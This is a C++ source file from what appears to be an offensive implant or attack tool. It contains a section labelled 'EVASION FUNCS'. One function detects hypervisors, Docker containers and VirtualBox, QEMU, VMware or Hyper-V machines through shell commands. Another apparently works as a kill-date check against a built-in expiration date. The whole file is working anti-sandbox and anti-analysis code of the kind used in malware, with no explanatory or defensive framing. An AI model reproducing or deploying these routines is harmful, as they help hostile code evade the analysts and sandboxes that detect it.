#include <boost/algorithm/string/split.hpp>
#include <boost/algorithm/string/classification.hpp>
#include <iostream>
#include <string>
#include <vector>

#include "local.hpp"
#include "evasion.hpp"
#include "globals.hpp"

////EVASION FUNCS
//check VM
bool Potevade::checkVM()
{
    bool IS_VM = false;
    //check /proc/cpuinfo for hypervisor

    if (std::stoi(Potlocal::passCommand("cat /proc/cpuinfo | grep hypervisor | wc -l")) != 0 ||
        //check if in docker //make anti-container optional
        std::stoi(Potlocal::passCommand("if [ -f /.dockerenv ]; then echo 1; else echo 0; fi")) == 1 ||
        Potlocal::passCommand("cat /proc/1/sched | head -1") == "bash (1, #threads: 1)")
        //check if in LXC
        //check if in KVM
        {
            std::cout << "HYPERVISOR/DOCKER DETECTED" << std::endl;
            IS_VM = true;
        }
    //if sudo, check dmidecode for VM names
    else if (Potlocal::getUID() == 0)
    {
        if (std::stoi(Potlocal::passCommand("dmidecode -t system | grep -i -e 'VirtualBox' -e 'Qemu' -e 'VMWare' -e 'Hyper-V'| wc -l")) != 0 )
        {
            IS_VM = true;
        }
    }
    return IS_VM;
}
//check expiration
bool Potevade::checkExpire()
{
    typedef std::vector<std::string> Tokens;
    Tokens tokens;
    boost::split( tokens, Potlocal::getTime(), boost::is_any_of(" ") );
    if (tokens[0] == expiration_date)
    {
        return true;
    }
    else
    {
        return false;
    }
}